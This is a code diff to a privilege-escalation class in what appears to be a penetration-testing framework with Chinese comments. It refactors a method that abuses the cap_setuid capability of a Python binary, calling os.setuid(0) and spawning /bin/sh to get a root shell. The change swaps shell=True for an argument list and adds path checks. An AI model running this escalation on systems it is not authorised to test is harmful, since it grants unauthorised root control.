@@ -195,14 +195,26 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
     def _exploit_cap_setuid(self, binary: str) -> EscalationResult:
         """利用 cap_setuid capability"""
         import subprocess
+        import shlex
 
-        # 如果是 Python
+        # 如果是 Python - 安全方式: 使用参数列表避免 shell=True
         if 'python' in binary:
-            cmd = f"{binary} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+            # 验证 binary 路径安全性
+            if not binary.startswith('/') or '..' in binary:
+                return EscalationResult(
+                    success=False,
+                    method=EscalationMethod.CAPABILITY,
+                    from_level=self.current_level,
+                    to_level=self.current_level,
+                    error=f"Invalid binary path: {binary}"
+                )
+
+            python_code = 'import os; os.setuid(0); os.system("/bin/sh")'
+            cmd_list = [binary, '-c', python_code]
             try:
                 result = subprocess.run(
-                    cmd,
-                    shell=True,
+                    cmd_list,
+                    shell=False,  # 安全: 禁用 shell
                     capture_output=True,
                     timeout=10
                 )
@@ -214,7 +226,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
                     output=f"Exploited {binary} with cap_setuid",
                     evidence=f"Binary: {binary}"
                 )
-            except Exception as e:
+            except (subprocess.TimeoutExpired, OSError, ValueError) as e:
                 pass
 
         return EscalationResult(
